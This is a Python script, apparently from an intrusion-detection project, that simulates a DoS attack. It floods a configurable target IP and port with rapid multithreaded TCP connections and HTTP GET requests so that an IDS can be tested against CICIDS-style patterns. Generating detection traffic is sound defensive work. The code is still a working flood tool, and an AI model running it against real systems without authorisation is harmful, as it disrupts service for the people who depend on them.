#!/usr/bin/env python3
"""
Intensive DoS Attack Simulator - Generates DoS-like patterns

This script generates traffic patterns that match CICIDS DoS attack characteristics:
- Very high packet rates (1000+ packets/second)
- Short IAT (inter-arrival times)
- Many small packets
- High Flow Packets/s, low Flow Bytes/s
"""

import socket
import threading
import time
import sys

TARGET_IP = "10.7.19.211"
TARGET_PORT = 80

def dos_intensive_flood(target_ip, port=80, duration=20, threads=50):
    """
    Intensive DoS flood that matches CICIDS DoS attack patterns:
    - Very high packet rate
    - Short IAT
    - Small packets
    - Rapid connections
    """
    print("=" * 70)
    print("🔥 INTENSIVE DoS ATTACK SIMULATOR")
    print("=" * 70)
    print(f"Target: {target_ip}:{port}")
    print(f"Duration: {duration} seconds")
    print(f"Concurrent threads: {threads}")
    print(f"Pattern: High-rate, short-IAT, small packets (DoS-like)")
    print("=" * 70)
    print()
    print("⚠️  This will generate intensive network traffic!")
    print("   Make sure your IDS sniffer is running.")
    print()
    time.sleep(2)
    
    connection_count = [0]  # Use list for thread-safe counter
    start_time = time.time()
    
    def flood_worker():
        """Worker thread that continuously makes connections"""
        while time.time() - start_time < duration:
            try:
                # Create connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)  # Very short timeout
                
                # Connect and send minimal data (DoS pattern: small packets)
                sock.connect((target_ip, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                
                # Close immediately (short-lived connection)
                sock.close()
                
                connection_count[0] += 1
                
                # Very short delay for high rate
                time.sleep(0.001)  # 1000 connections/second potential per thread
            except:
                # Ignore errors, keep flooding
                time.sleep(0.001)
    
    # Start worker threads
    worker_threads = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, daemon=True)
        t.start()
        worker_threads.append(t)
    
    # Monitor progress
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            rate = connection_count[0] / elapsed if elapsed > 0 else 0
            print(f"   Progress: {elapsed:.1f}s / {duration}s | "
                  f"Connections: {connection_count[0]} | "
                  f"Rate: {rate:.1f} conn/s", end='\r')
            time.sleep(1)
        
        print()  # New line after progress
        
        # Wait for threads to finish
        for t in worker_threads:
            t.join(timeout=1)
        
        total_time = time.time() - start_time
        final_rate = connection_count[0] / total_time if total_time > 0 else 0
        
        print()
        print("=" * 70)
        print("✅ DoS Attack Simulation Complete!")
        print(f"   Total connections: {connection_count[0]}")
        print(f"   Duration: {total_time:.2f} seconds")
        print(f"   Average rate: {final_rate:.1f} connections/second")
        print("=" * 70)
        print()
        print("📊 Check your IDS logs for DoS detection:")
        print("   tail -f backend/logs/ids_alerts.log")
        print()
        
        return True
    except KeyboardInterrupt:
        print(f"\n\n⚠️  Attack interrupted. Made {connection_count[0]} connections")
        return False

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Intensive DoS Attack Simulator')
    parser.add_argument('--target', default=TARGET_IP, help=f'Target IP (default: {TARGET_IP})')
    parser.add_argument('--port', type=int, default=TARGET_PORT, help=f'Target port (default: {TARGET_PORT})')
    parser.add_argument('--duration', type=int, default=20, help='Duration in seconds (default: 20)')
    parser.add_argument('--threads', type=int, default=50, help='Number of concurrent threads (default: 50)')
    
    args = parser.parse_args()
    
    dos_intensive_flood(args.target, args.port, args.duration, args.threads)

